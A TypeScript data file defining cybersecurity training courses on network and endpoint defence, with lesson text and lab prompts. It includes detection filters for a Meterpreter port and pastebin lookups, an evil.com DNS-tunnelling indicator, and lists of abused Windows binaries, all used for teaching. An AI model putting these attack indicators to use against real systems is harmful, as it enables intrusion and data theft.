import type { Course, CourseModule } from './index';

function L(id: string, title: string, xp: number, content: string): CourseModule {
  return { id, title, type: 'LESSON', durationMin: 15, xpReward: xp, content };
}
function LAB(id: string, title: string, xp: number, labPrompt: string, labKeywords: string[]): CourseModule {
  return { id, title, type: 'LAB', durationMin: 25, xpReward: xp, labPrompt, labKeywords };
}
function SIM(id: string, title: string, xp: number, scenarioContext: string): CourseModule {
  return { id, title, type: 'SIMULATION', durationMin: 20, xpReward: xp, scenarioContext };
}

export const EXTRA_COURSES: Course[] = [

  // ══════════════════════════════════════════════════
  // DOMAIN 1: NETWORK SECURITY  (10 courses)
  // ══════════════════════════════════════════════════

  {
    id: 'net-tcp-ip',
    title: 'TCP/IP Security Fundamentals',
    description: 'Understand how the TCP/IP stack is exploited and how to defend each layer.',
    category: 'network-security',
    difficulty: 'beginner',
    accentColor: '#60a5fa',
    modules: [
      L('net-tcp-l1', 'TCP/IP Stack & Attack Surfaces', 75, `## TCP/IP Security Fundamentals

The TCP/IP model forms the backbone of all internet communication. Each layer introduces unique attack surfaces.

### Layer Threats
- **Network (IP):** IP spoofing, packet fragmentation, ICMP floods
- **Transport (TCP/UDP):** SYN floods, session hijacking, port scanning
- **Application:** Protocol-specific exploits (HTTP, DNS, FTP)

### Key Attacks
**SYN Flood:** Attacker sends thousands of SYN packets without completing the handshake, exhausting server resources. Mitigate with SYN cookies.

**IP Spoofing:** Forging source IP addresses to impersonate trusted hosts or bypass IP-based ACLs.

**Session Hijacking:** Predicting TCP sequence numbers to inject malicious packets into established sessions.

### Defense Controls
- Stateful packet inspection firewalls
- Ingress/egress filtering (BCP38)
- Encrypted protocols (TLS, SSH) to prevent eavesdropping
- Network segmentation to limit blast radius

Understanding the protocol stack is prerequisite knowledge for any network security role.`),
      LAB('net-tcp-lab1', 'Analyze a SYN Flood PCAP', 100, 'You have captured network traffic showing a suspected SYN flood attack. Describe: the indicators in the packet capture, how SYN cookies work as a mitigation, the firewall rules you would implement, and how you would differentiate a SYN flood from legitimate traffic spikes.', ['SYN flood', 'SYN cookies', 'TCP handshake', 'packet capture', 'firewall rule', 'stateful inspection', 'BCP38']),
    ],
  },

  {
    id: 'net-firewall',
    title: 'Firewall Configuration & Management',
    description: 'Design, implement, and audit firewall rule sets for enterprise networks.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-fw-l1', 'Firewall Architectures & Rule Design', 75, `## Firewall Configuration & Management

Firewalls are the primary network perimeter control. Poor rule design is one of the most common security failures.

### Firewall Types
- **Packet Filter:** Stateless, inspects headers only — fast but limited
- **Stateful Inspection:** Tracks connection state; allows return traffic automatically
- **Next-Gen Firewall (NGFW):** Deep packet inspection, application-layer filtering, IPS, URL filtering

### Rule Design Principles
1. **Default-deny:** Block everything; explicitly allow only needed traffic
2. **Least privilege:** Narrowest source/destination/port ranges possible
3. **Rule order matters:** First-match wins in most platforms
4. **Log denied traffic:** Critical for detecting reconnaissance

### Common Misconfigurations
- Overly broad ANY/ANY rules left from testing
- Inbound rules allowing management ports from the internet
- No egress filtering (attackers use outbound connections for C2)
- Undocumented legacy rules accumulating over years

### Audit Practice
Review rules quarterly. Flag any rule with source=ANY or port=ANY and require justification. Automated tools like Tufin or Algosec help in large environments.`),
      LAB('net-fw-lab1', 'Firewall Rule Audit Exercise', 100, 'You are reviewing a firewall rule set for a small company. You find: rule 1 allows ANY-to-ANY on port 22, rule 5 allows inbound RDP from 0.0.0.0/0, rule 12 was added 3 years ago with no comment. Document each problem, the risk it creates, and the corrected rule you would implement. Also explain how you would implement egress filtering.', ['default deny', 'egress filtering', 'RDP exposure', 'SSH restriction', 'rule documentation', 'least privilege', 'NGFW', 'audit']),
    ],
  },

  {
    id: 'net-vpn',
    title: 'VPN Technologies & Security',
    description: 'Evaluate VPN protocols, configure secure tunnels, and identify VPN-based attack vectors.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-vpn-l1', 'VPN Protocols & Security Tradeoffs', 75, `## VPN Technologies & Security

VPNs create encrypted tunnels over untrusted networks. Choosing the wrong protocol or misconfiguring VPNs creates serious risk.

### Common VPN Protocols
| Protocol | Encryption | Use Case | Risk |
|----------|-----------|----------|------|
| OpenVPN | AES-256/TLS | General purpose | Config complexity |
| WireGuard | ChaCha20 | Modern, high-perf | Newer, less audited |
| IPSec/IKEv2 | AES-256 | Enterprise, mobile | Complex key mgmt |
| PPTP | MPPE (weak) | Legacy | **DEPRECATED — avoid** |
| SSL/TLS VPN | TLS 1.3 | Browser-based access | Session token theft |

### VPN Attack Vectors
- **Credential theft:** Phishing VPN login pages to capture credentials
- **Split tunneling abuse:** Users route non-corporate traffic outside VPN
- **Unpatched VPN appliances:** CVEs in Pulse Secure, Fortinet, Cisco ASA frequently exploited by APT groups
- **Certificate pinning bypass:** MITM on TLS VPN if client doesn't pin server cert

### Zero Trust vs VPN
Modern organizations are replacing traditional VPN with Zero Trust Network Access (ZTNA) — continuous authentication based on identity, device posture, and context rather than a persistent tunnel.`),
      LAB('net-vpn-lab1', 'VPN Security Assessment', 100, 'Your organization uses an SSL VPN appliance that was last patched 14 months ago. During a threat hunt you find outbound connections to an unusual IP on port 443 from the VPN server. Describe: how you investigate the VPN appliance for known CVEs, what logs you examine, indicators of compromise for VPN appliance exploitation, and your remediation plan including whether to consider ZTNA migration.', ['CVE', 'VPN appliance', 'patch management', 'indicators of compromise', 'ZTNA', 'split tunneling', 'certificate', 'threat hunt']),
    ],
  },

  {
    id: 'net-ids-ips',
    title: 'Network Intrusion Detection & Prevention',
    description: 'Deploy and tune NIDS/NIPS to detect attacks without drowning in false positives.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-ids-l1', 'IDS vs IPS: Detection Strategies', 75, `## Network Intrusion Detection & Prevention

IDS (Intrusion Detection System) monitors and alerts. IPS (Intrusion Prevention System) monitors and blocks. Both are critical layers of defense-in-depth.

### Detection Methods
**Signature-based:** Matches known attack patterns. Fast, low false positives for known threats. Blind to zero-days.

**Anomaly-based:** Learns baseline behavior and alerts on deviations. Catches novel attacks but generates more false positives.

**Policy-based:** Alerts on protocol violations regardless of content. Useful for enforcing network segmentation.

### Placement Strategy
- **Network perimeter:** Catches inbound/outbound threats
- **Between segments:** Detects lateral movement
- **Before/after WAF:** Catches different attack layers

### Tuning to Reduce Alert Fatigue
Alert fatigue kills security programs. Key tuning steps:
1. Suppress alerts for known-good traffic (scheduled backups, monitoring)
2. Raise thresholds for noisy signatures
3. Prioritize by asset criticality (alerts from database servers > workstations)
4. Correlate with SIEM to identify true positives

### Common Evasion Techniques
- Packet fragmentation to split signatures across packets
- Protocol obfuscation (encoding, tunneling)
- Slow scanning to stay under rate thresholds`),
      LAB('net-ids-lab1', 'Tune an IDS Rule Set', 100, 'You inherit an IDS generating 50,000 alerts per day. Your SOC analysts can investigate 200. Describe your tuning methodology: how you identify high-volume low-value rules, how you use whitelisting, how you prioritize by asset tier, and how you measure whether tuning improves detection quality rather than just reducing volume. Include how you would detect lateral movement specifically.', ['alert tuning', 'false positive', 'signature-based', 'anomaly detection', 'lateral movement', 'asset criticality', 'whitelisting', 'alert fatigue']),
    ],
  },

  {
    id: 'net-dns-security',
    title: 'DNS Security & Poisoning Attacks',
    description: 'Protect DNS infrastructure from cache poisoning, hijacking, and tunneling attacks.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-dns-l1', 'DNS Attack Vectors & DNSSEC', 75, `## DNS Security & Poisoning Attacks

DNS is the internet's phone book — and one of the most abused protocols in modern attacks. Compromising DNS can redirect all traffic silently.

### DNS Cache Poisoning (Kaminsky Attack)
An attacker races to inject a forged DNS response before the legitimate response arrives. Once cached, all users querying that resolver get the malicious IP. The Kaminsky attack (2008) showed this could be exploited in seconds.

**Mitigation:** DNSSEC signs records cryptographically. Resolvers validate signatures before caching.

### DNS Hijacking
Attackers modify DNS records at the registrar or hosting provider level. Harder to detect than cache poisoning because the authoritative server itself is compromised.

### DNS Tunneling
Attackers encode data in DNS queries/responses to exfiltrate data or establish C2 channels. Many firewalls allow DNS outbound — making this a common evasion technique.

**Detection:** Unusually long DNS queries, high query volume for one domain, queries with base64-encoded subdomains.

### Protective Controls
- **DNSSEC:** Cryptographic signing of DNS records
- **DNS over HTTPS (DoH) / DNS over TLS (DoT):** Encrypt queries
- **RPZ (Response Policy Zones):** Block malicious domains at resolver
- **Monitor DNS logs:** Detect tunneling, DGA domains, beaconing`),
      LAB('net-dns-lab1', 'Detect DNS Tunneling', 100, 'Your DNS logs show a workstation making 2,000 queries per hour to subdomains of a domain registered 2 days ago, with query names like "aGVsbG8gd29ybGQ.evil.com". Describe: how you confirm this is DNS tunneling, what tools you use for analysis, how you block it immediately, and what longer-term DNS security controls you implement including DNSSEC and RPZ.', ['DNS tunneling', 'DNSSEC', 'RPZ', 'base64', 'DGA', 'cache poisoning', 'DNS over HTTPS', 'exfiltration']),
    ],
  },

  {
    id: 'net-segmentation',
    title: 'Network Segmentation & DMZ Design',
    description: 'Architect segmented networks that contain breaches and limit attacker lateral movement.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-seg-l1', 'Segmentation Architecture Principles', 75, `## Network Segmentation & DMZ Design

Network segmentation is one of the highest-value security controls. A breach in a flat network means complete compromise; in a segmented network, attackers are contained.

### DMZ (Demilitarized Zone)
A DMZ sits between the internet and internal network. Public-facing servers (web, email, VPN) live in the DMZ. They can communicate outbound to the internet but have limited access to internal systems.

### Segmentation Tiers
| Zone | Examples | Trust Level |
|------|---------|-------------|
| Internet | External users | Untrusted |
| DMZ | Web servers, APIs | Low |
| Corporate | Workstations | Medium |
| Server | Internal apps, DB | High |
| Critical | OT/ICS, Exec | Very High |

### Micro-Segmentation
Traditional VLANs segment at the network layer. Micro-segmentation (SDN, VMware NSX, Cisco ACI) enforces policy at the workload level — each VM or container gets its own security policy.

### Zero Trust Architecture
"Never trust, always verify." Even within the network, every connection is authenticated, authorized, and logged. Eliminates the implicit trust of traditional perimeter models.

### Lateral Movement Defense
- Disable unnecessary inter-VLAN routing
- Block SMB/RDP between workstations
- Monitor for port scanning behavior internally`),
      LAB('net-seg-lab1', 'Design a Segmented Network', 100, 'A manufacturing company has 500 workstations, 20 servers, an OT/SCADA network controlling production lines, and a public website. Currently everything is on one flat /16 subnet. Design a segmented network architecture: define your zones, firewall rules between zones, how you handle the OT/IT air gap requirement, and how you detect if an attacker moves between segments.', ['VLAN', 'DMZ', 'OT security', 'SCADA', 'micro-segmentation', 'lateral movement', 'air gap', 'firewall zones']),
    ],
  },

  {
    id: 'net-wireless',
    title: 'Wireless Network Security',
    description: 'Secure Wi-Fi deployments, detect rogue access points, and respond to wireless attacks.',
    category: 'network-security',
    difficulty: 'beginner',
    accentColor: '#60a5fa',
    modules: [
      L('net-wifi-l1', 'Wi-Fi Protocols & Attack Techniques', 75, `## Wireless Network Security

Wireless networks extend your attack surface beyond physical boundaries. Anyone within radio range can attempt to access your network.

### Protocol Evolution
- **WEP:** Completely broken — crackable in minutes. Never use.
- **WPA/WPA2-PSK:** Pre-shared key; vulnerable to offline dictionary attacks if the passphrase is weak
- **WPA2-Enterprise (802.1X):** Per-user authentication via RADIUS. Much stronger.
- **WPA3:** Modern standard with SAE (Simultaneous Authentication of Equals), resistant to offline attacks

### Common Attacks
**Evil Twin / Rogue AP:** Attacker sets up an access point mimicking your corporate SSID. Users connect and route all traffic through the attacker.

**PMKID Attack:** Captures a single packet from a WPA2 network (no client needed) to perform offline cracking of the PSK.

**Deauthentication Flood:** Forces clients to disconnect and reconnect, enabling capture of the 4-way handshake for cracking.

**Karma Attack:** Rogue AP responds to any probe request, impersonating networks a device has previously connected to.

### Defense Controls
- WPA3 or WPA2-Enterprise with certificate-based authentication
- Wireless Intrusion Prevention System (WIPS) to detect rogue APs
- 802.1X with device certificates — reject uncertified devices
- Separate guest network with no access to corporate resources
- Regular RF surveys to detect unauthorized APs`),
      LAB('net-wifi-lab1', 'Respond to a Rogue Access Point', 100, 'Your WIPS alert shows an access point broadcasting your corporate SSID from an unknown MAC address in the building. Users have connected to it. Describe: how you identify the physical location of the rogue AP, what traffic may have been captured, how you force users to disconnect, and what longer-term controls prevent this scenario including WPA3-Enterprise deployment.', ['rogue AP', 'evil twin', 'WPA3-Enterprise', '802.1X', 'WIPS', 'RADIUS', 'deauthentication', 'RF survey']),
    ],
  },

  {
    id: 'net-ddos',
    title: 'DDoS Attacks & Mitigation',
    description: 'Understand volumetric, protocol, and application-layer DDoS attacks and how to survive them.',
    category: 'network-security',
    difficulty: 'intermediate',
    accentColor: '#60a5fa',
    modules: [
      L('net-ddos-l1', 'DDoS Attack Types & Defense', 75, `## DDoS Attacks & Mitigation

Distributed Denial of Service attacks overwhelm your infrastructure with traffic until legitimate users cannot access services. Modern attacks combine multiple vectors simultaneously.

### Attack Categories
**Volumetric (Layer 3/4):** Flood bandwidth with UDP floods, ICMP floods, amplification attacks. Can reach terabits/second using botnets.

**Protocol Attacks:** Exploit weaknesses in TCP/IP (SYN floods, Ping of Death, Smurf attacks) to exhaust connection tables.

**Application Layer (L7):** HTTP floods targeting specific endpoints. Harder to distinguish from legitimate traffic; low bandwidth but devastating.

### Amplification Attacks
DNS, NTP, and memcached can amplify attack traffic 50-50,000×. Attacker sends small spoofed packet to open resolver; massive response sent to victim.

**Example:** A 1 Gbps botnet can generate 50+ Tbps using memcached amplification.

### Mitigation Strategy
1. **Scrubbing centers:** Route traffic through DDoS mitigation providers (Cloudflare, Akamai, AWS Shield)
2. **Anycast routing:** Distribute attack traffic across global PoPs
3. **Rate limiting:** At ISP level and application level
4. **BGP blackholing:** Null-route attacked IPs during an incident
5. **Auto-scaling:** Cloud infrastructure scales to absorb spikes
6. **Web Application Firewall:** L7 filtering for HTTP floods

Always have an incident response plan before an attack occurs — DDoS response under pressure is chaotic.`),
      LAB('net-ddos-lab1', 'DDoS Incident Response', 100, 'Your e-commerce site is under a DDoS attack during Black Friday. Traffic has jumped from 10 Gbps to 800 Gbps. Your upstream bandwidth is 20 Gbps. Describe your minute-by-minute incident response: immediate triage steps, how you activate your DDoS mitigation provider, what BGP blackholing means and when you use it, and your post-incident analysis including attacker attribution attempts.', ['volumetric DDoS', 'BGP blackholing', 'scrubbing center', 'amplification', 'CDN', 'rate limiting', 'anycast', 'incident response']),
    ],
  },

  {
    id: 'net-traffic-analysis',
    title: 'Network Traffic Analysis',
    description: 'Use Wireshark, Zeek, and NetFlow to analyze traffic and identify malicious patterns.',
    category: 'network-security',
    difficulty: 'advanced',
    accentColor: '#60a5fa',
    modules: [
      L('net-ta-l1', 'Traffic Analysis Tools & Techniques', 75, `## Network Traffic Analysis

Network traffic analysis (NTA) is a core SOC skill. It lets you reconstruct attacks, detect beaconing, and identify exfiltration — even when endpoint logs are unavailable.

### Key Tools
**Wireshark:** Full packet capture and deep inspection. Read PCAP files, apply display filters, follow TCP streams, decrypt TLS (with keys).

**Zeek (formerly Bro):** Converts raw packets into structured logs (conn.log, dns.log, http.log, ssl.log). Excellent for long-term retention and analysis.

**NetFlow/IPFIX:** Flow records (src/dst IP, port, bytes, duration). No packet payload — lightweight, great for anomaly detection at scale.

**Suricata:** Open-source IDS/IPS with NTA capabilities; generates EVE JSON logs compatible with SIEMs.

### What to Look For
- **Beaconing:** Regular outbound connections at fixed intervals (C2 heartbeat)
- **Large exfiltration:** Unusually high bytes to external IP
- **Lateral movement:** Internal scanning, SMB/RDP connections between workstations
- **DNS anomalies:** High query volume, long names, low-TTL records
- **Protocol misuse:** Unexpected protocols on standard ports (HTTP on 443, SSH on 80)

### Wireshark Filter Examples
\`\`\`
tcp.flags.syn == 1 && tcp.flags.ack == 0  // SYN packets only
http.request.method == "POST"              // HTTP POST requests
dns.qry.name contains "pastebin"          // DNS queries to pastebin
ip.dst == 10.0.0.5 && tcp.port == 4444    // Meterpreter default port
\`\`\``),
      LAB('net-ta-lab1', 'Investigate C2 Beaconing', 100, 'You have NetFlow data showing a workstation making outbound connections to 185.220.101.45:443 every 60 seconds for the past 6 hours, each transferring exactly 512 bytes. Describe: how you confirm this is C2 beaconing versus legitimate traffic, what Wireshark/Zeek analysis you perform, how you identify what malware is responsible, and your containment steps.', ['beaconing', 'C2', 'NetFlow', 'Zeek', 'Wireshark', 'lateral movement', 'malware', 'containment']),
    ],
  },

  {
    id: 'net-zero-trust-network',
    title: 'Zero Trust Network Architecture',
    description: 'Move beyond perimeter security by implementing Zero Trust principles across your network.',
    category: 'network-security',
    difficulty: 'advanced',
    accentColor: '#60a5fa',
    modules: [
      L('net-zt-l1', 'Zero Trust Principles & Implementation', 75, `## Zero Trust Network Architecture

Zero Trust rejects the "castle and moat" model. The principle: **never trust, always verify** — regardless of whether a request comes from inside or outside the network.

### Core Tenets (NIST SP 800-207)
1. All data sources and computing services are resources
2. All communication is secured regardless of network location
3. Access to individual resources is granted per-session
4. Access is determined by dynamic policy including observable state
5. No device is implicitly trusted; posture is assessed continuously
6. Authentication and authorization are strictly enforced

### Key Components
**Identity Provider (IdP):** Okta, Azure AD — single source of truth for identity. MFA mandatory.

**Device Trust:** Only managed, compliant devices get access. MDM/EDR posture checked before granting access.

**Policy Engine:** Evaluates every access request in real-time: who is the user, what device, from where, to what resource, at what time?

**Micro-segmentation:** Workload-level firewalls prevent east-west movement.

**Encrypted Traffic:** mTLS between all services; no plaintext internal communication.

### ZTNA vs VPN
Traditional VPN grants network-level access after authentication. ZTNA grants application-level access continuously re-evaluated based on context. A compromised VPN client gets everything; a compromised ZTNA client gets only what it was authorized for.

### Maturity Model
Start with identity (MFA everywhere), then device trust, then micro-segmentation, then application-layer access controls.`),
      SIM('net-zt-sim1', 'Architect a Zero Trust Migration', 100, 'You are presenting a Zero Trust migration plan to a CISO who runs a traditional perimeter-based network with 2,000 employees. The CISO is skeptical about cost and disruption. Walk through your phased implementation plan, address their concerns about complexity, and explain what attacks would be prevented that VPN cannot prevent.'),
    ],
  },

  // ══════════════════════════════════════════════════
  // DOMAIN 2: ENDPOINT SECURITY  (10 courses)
  // ══════════════════════════════════════════════════

  {
    id: 'ep-edr',
    title: 'Endpoint Detection & Response (EDR)',
    description: 'Deploy and operate EDR tools to detect, investigate, and respond to endpoint threats.',
    category: 'endpoint-security',
    difficulty: 'intermediate',
    accentColor: '#34d399',
    modules: [
      L('ep-edr-l1', 'EDR Capabilities & Investigation Workflow', 75, `## Endpoint Detection & Response (EDR)

EDR platforms are the evolution of antivirus — they record everything that happens on an endpoint and enable real-time detection and response.

### What EDR Records
- Every process creation (parent/child relationships)
- File system changes (create, modify, delete)
- Registry modifications
- Network connections (IP, port, domain)
- User logon/logoff events
- Script execution (PowerShell, WScript, macOS bash)

### Key EDR Platforms
| Platform | Vendor | Notable Feature |
|----------|--------|----------------|
| CrowdStrike Falcon | CrowdStrike | ML-based prevention, Threat Graph |
| Microsoft Defender XDR | Microsoft | Native Windows integration |
| SentinelOne | SentinelOne | Autonomous response, rollback |
| Carbon Black | VMware | Process tree visualization |
| Cortex XDR | Palo Alto | Cross-layer correlation |

### Investigation Workflow
1. Alert triggers on suspicious behavior
2. Review process tree — what spawned what?
3. Check network connections from the process
4. Review file drops and persistence mechanisms
5. Pivot to related hosts via Threat Graph
6. Contain: isolate host, kill process, quarantine file

### Detection Logic: Behavioral Indicators
Don't rely only on hash-based detection. Attackers change file hashes constantly. Behavioral detections catch:
- Word.exe spawning cmd.exe (macro execution)
- PowerShell with base64-encoded arguments
- LSASS memory access (credential dumping)
- Services created with unusual paths`),
      LAB('ep-edr-lab1', 'Investigate an EDR Alert', 100, 'Your EDR alerts: Word.exe spawned PowerShell.exe with base64-encoded arguments at 2:47 PM. The PowerShell process then made an outbound connection to 93.184.216.34:443 and downloaded a file named "update.exe". Describe your full investigation: decode the base64, identify the attack stage, trace all child processes, determine persistence mechanisms likely used, and write your containment and eradication plan.', ['process tree', 'base64', 'macro execution', 'PowerShell', 'LOLBins', 'persistence', 'containment', 'lateral movement']),
    ],
  },

  {
    id: 'ep-malware-basics',
    title: 'Malware Analysis Fundamentals',
    description: 'Analyze malicious files using static and dynamic techniques to understand attacker capabilities.',
    category: 'endpoint-security',
    difficulty: 'advanced',
    accentColor: '#34d399',
    modules: [
      L('ep-mal-l1', 'Static & Dynamic Malware Analysis', 75, `## Malware Analysis Fundamentals

Malware analysis lets you understand what an attacker can do, how they persist, and what network indicators to block.

### Analysis Environments
Always analyze malware in an **isolated VM** with snapshots. Never on bare metal. Use dedicated malware analysis platforms like FlareVM (Windows) or REMnux (Linux).

### Static Analysis (No Execution)
- **File hashing:** MD5/SHA256 for identification; check VirusTotal
- **Strings analysis:** Extract readable strings (URLs, file paths, registry keys, error messages)
- **PE header analysis:** Imports (DLLs used), sections, packer detection
- **YARA rules:** Pattern matching for known malware families

### Dynamic Analysis (Execute & Observe)
- **Process Monitor (Procmon):** Watch file/registry/process activity
- **Wireshark:** Capture network connections
- **Process Explorer:** View running processes, DLL injection
- **Regshot:** Before/after registry snapshot comparison
- **Cuckoo Sandbox:** Automated dynamic analysis

### Indicators to Extract
From every sample, document:
- C2 IP addresses and domains
- File paths and names dropped
- Registry keys for persistence
- Mutex names (unique per malware family)
- Network signatures (user-agent strings, URI patterns)

### Common Malware Families
- **RAT (Remote Access Trojan):** njRAT, AsyncRAT, Quasar
- **Infostealer:** Redline, Raccoon, Vidar
- **Loader:** Emotet, Qbot, IcedID
- **Ransomware:** LockBit, ALPHV/BlackCat, Conti`),
      LAB('ep-mal-lab1', 'Static Analysis Exercise', 100, 'You receive a suspicious file "invoice_2024.exe" (SHA256: abc123). Static analysis shows it imports CreateRemoteThread, VirtualAllocEx, and WriteProcessMemory. Strings include "http://update.microsofft.com/patch" and "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run". Analyze these findings: what do the imports suggest, what is the significance of each string, what malware family category does this suggest, and what YARA rule would you write to detect this family.', ['process injection', 'CreateRemoteThread', 'registry persistence', 'Run key', 'typosquatting', 'YARA', 'static analysis', 'C2 domain']),
    ],
  },

  {
    id: 'ep-windows-hardening',
    title: 'Windows Security Hardening',
    description: 'Apply CIS Benchmarks and Microsoft security baselines to harden Windows endpoints.',
    category: 'endpoint-security',
    difficulty: 'intermediate',
    accentColor: '#34d399',
    modules: [
      L('ep-win-l1', 'Windows Hardening Controls', 75, `## Windows Security Hardening

Default Windows configurations prioritize usability over security. Hardening systematically reduces attack surface using proven baselines.

### CIS Benchmark Level 1 (Essential)
- Enable Windows Defender with cloud protection and automatic sample submission
- Configure Windows Firewall: block inbound, allow established outbound
- Disable SMBv1 (used by WannaCry, NotPetya)
- Enable BitLocker on all drives
- Require complex passwords (14+ characters)
- Disable AutoRun/AutoPlay

### CIS Benchmark Level 2 (High Security)
- AppLocker or WDAC (Windows Defender Application Control) — whitelist approved executables
- PowerShell Constrained Language Mode
- Credential Guard — protect LSASS with virtualization
- Attack Surface Reduction (ASR) rules — block Office macros from spawning child processes

### Key Security Features
**Windows Defender Credential Guard:** Isolates LSASS in a hypervisor-protected container, preventing credential dumping via Mimikatz.

**Protected Users Security Group:** Members cannot use NTLM, cannot cache credentials, Kerberos tickets expire in 4 hours.

**LAPS (Local Administrator Password Solution):** Randomizes local admin passwords per machine, preventing lateral movement via shared credentials.

**AppLocker Rules:** Block execution from %TEMP%, %APPDATA%, Downloads — where most malware is dropped.

### Group Policy Automation
Use Microsoft Security Compliance Toolkit to import pre-built GPOs. Test in a dev OU before deploying to production.`),
      LAB('ep-win-lab1', 'Apply Windows Hardening GPO', 100, 'A penetration tester has reported they can dump NTLM hashes using Mimikatz on any workstation, move laterally using pass-the-hash, and run scripts from the Downloads folder without restriction. Describe the specific Windows hardening controls that address each finding: what Group Policy settings prevent credential dumping, how LAPS prevents pass-the-hash, and how AppLocker/WDAC prevents execution from Downloads.', ['Credential Guard', 'LAPS', 'pass-the-hash', 'AppLocker', 'WDAC', 'Mimikatz', 'NTLM', 'Group Policy']),
    ],
  },

  {
    id: 'ep-linux-hardening',
    title: 'Linux Security Hardening',
    description: 'Secure Linux servers using principle of least privilege, auditing, and hardened kernel settings.',
    category: 'endpoint-security',
    difficulty: 'intermediate',
    accentColor: '#34d399',
    modules: [
      L('ep-linux-l1', 'Linux Hardening Controls', 75, `## Linux Security Hardening

Linux servers are high-value targets. They often run internet-facing services, store sensitive data, and are accessed by many users.

### User & Privilege Controls
- Disable root SSH login (\`PermitRootLogin no\`)
- Use SSH key authentication, disable password auth
- sudo with minimal privilege: specific commands only, not ALL
- Remove unused accounts, check for accounts with shell access
- Implement PAM (Pluggable Authentication Modules) for strong auth

### Kernel Hardening (sysctl)
\`\`\`bash
net.ipv4.tcp_syncookies = 1          # SYN flood protection
net.ipv4.conf.all.rp_filter = 1      # IP spoofing protection
kernel.randomize_va_space = 2         # ASLR
kernel.dmesg_restrict = 1             # Hide kernel messages from users
fs.suid_dumpable = 0                  # No core dumps from SUID programs
\`\`\`

### Mandatory Access Control
**SELinux (RHEL/CentOS):** Enforce mode — processes can only access what policy explicitly allows. Even root is restricted.

**AppArmor (Ubuntu/Debian):** Profile-based confinement — attach security profiles to programs.

### File System Security
- Mount /tmp with noexec,nosuid,nodev
- Enable disk encryption (LUKS)
- Regular integrity checking with AIDE or Tripwire
- Immutable flag on critical files: \`chattr +i /etc/passwd\`

### Audit Logging
\`\`\`bash
auditctl -a always,exit -F arch=b64 -S execve  # Log all command execution
auditctl -w /etc/passwd -p wa                   # Watch /etc/passwd writes
\`\`\`
Forward auditd logs to centralized SIEM immediately.`),
      LAB('ep-linux-lab1', 'Harden a Compromised Linux Server', 100, 'Post-incident analysis shows an attacker gained access via a weak SSH password, escalated to root via a SUID binary, installed a backdoor in /tmp, and added a cron job. Describe each remediation step: how you find and remove the backdoor, how you prevent SUID escalation, how you harden SSH, and what audit rules you add to detect similar activity in the future.', ['SSH hardening', 'SUID', 'cron persistence', 'auditd', 'SELinux', 'PAM', 'sudo', 'file integrity']),
    ],
  },

  {
    id: 'ep-patch-management',
    title: 'Vulnerability & Patch Management',
    description: 'Build a systematic patching program that eliminates exploitable vulnerabilities at scale.',
    category: 'endpoint-security',
    difficulty: 'beginner',
    accentColor: '#34d399',
    modules: [
      L('ep-patch-l1', 'Patch Management Lifecycle', 75, `## Vulnerability & Patch Management

Unpatched systems are the most common cause of data breaches. A structured patch management program eliminates known vulnerabilities before attackers exploit them.

### Vulnerability Management Lifecycle
1. **Discovery:** Identify all assets (you can't patch what you don't know exists)
2. **Scanning:** Authenticated scans with Nessus, Qualys, or Rapid7
3. **Prioritization:** CVSS score + asset criticality + exploitability
4. **Testing:** Apply patches to dev/test environment first
5. **Deployment:** Staged rollout using WSUS, SCCM, or Ansible
6. **Verification:** Re-scan to confirm patch applied
7. **Reporting:** Track mean time to remediate (MTTR) by severity

### CVSS Scoring
Common Vulnerability Scoring System rates vulnerabilities 0-10:
- **Critical (9.0-10.0):** Patch within 24-72 hours
- **High (7.0-8.9):** Patch within 7-14 days
- **Medium (4.0-6.9):** Patch within 30 days
- **Low (0.1-3.9):** Patch within 90 days or accept risk

### CISA KEV Catalog
CISA maintains a Known Exploited Vulnerabilities catalog. If a CVE is in the KEV catalog, it's being actively exploited in the wild — treat it as Critical regardless of CVSS score.

### Patching Challenges
- **Legacy systems:** Can't be patched (OT, medical devices) — isolate instead
- **Uptime requirements:** Use live patching (ksplice for kernel)
- **Application dependencies:** Patches break APIs — coordinate with dev team
- **Patch fatigue:** Automate low-risk patches (OS updates); manual review for critical app patches`),
      LAB('ep-patch-lab1', 'Build a Patching SLA', 100, 'Your vulnerability scan shows 3 critical CVEs (including one in CISA KEV), 47 high CVEs, 200 medium CVEs across 500 endpoints. Your team of 2 engineers is overwhelmed. Design a patch management program: define your SLAs per severity, how you prioritize the KEV CVE, how you use automation to scale, and how you handle a legacy Windows XP machine running a critical manufacturing process that cannot be patched.', ['CVSS', 'KEV', 'MTTR', 'patch SLA', 'legacy system', 'risk acceptance', 'automation', 'Nessus']),
    ],
  },

  {
    id: 'ep-app-whitelisting',
    title: 'Application Control & Whitelisting',
    description: 'Prevent unauthorized software execution using AppLocker, WDAC, and software restriction policies.',
    category: 'endpoint-security',
    difficulty: 'advanced',
    accentColor: '#34d399',
    modules: [
      L('ep-wl-l1', 'Application Control Strategies', 75, `## Application Control & Whitelisting

Application whitelisting only allows approved software to execute. It is one of the most effective controls against malware — ransomware and most malware are blocked by default.

### AppLocker vs WDAC
**AppLocker:** User-mode control; blocks apps based on publisher, path, or hash. Can be bypassed by admin users.

**WDAC (Windows Defender Application Control):** Kernel-mode enforcement; enforced even for local administrators. Much harder to bypass.

### Rule Types
- **Publisher rules:** Trust software signed by Microsoft, Adobe — covers updates automatically
- **Path rules:** Allow execution only from C:\\Program Files — block %TEMP%, %APPDATA%
- **Hash rules:** Pin specific file versions — requires updates when files change

### LOLBins (Living Off the Land Binaries)
Attackers abuse legitimate Windows tools to bypass application control: cscript.exe, mshta.exe, regsvr32.exe, wmic.exe. These are signed by Microsoft.

**Mitigation:** Use WDAC to block specific LOLBins that have no legitimate use in your environment. Microsoft provides recommended block rules.

### Deployment Strategy
1. Audit mode first — log what would be blocked without actually blocking
2. Analyze logs — identify legitimate software that would be blocked
3. Create exceptions for legitimate use cases
4. Enforce mode — enable blocking

### Common Bypass Paths
- Unsigned scripts (.ps1, .vbs, .bat) executed by whitelisted interpreters
- DLL injection into whitelisted processes
- Trusted Installer bypasses

Combine application control with PowerShell Constrained Language Mode and script block logging for comprehensive coverage.`),
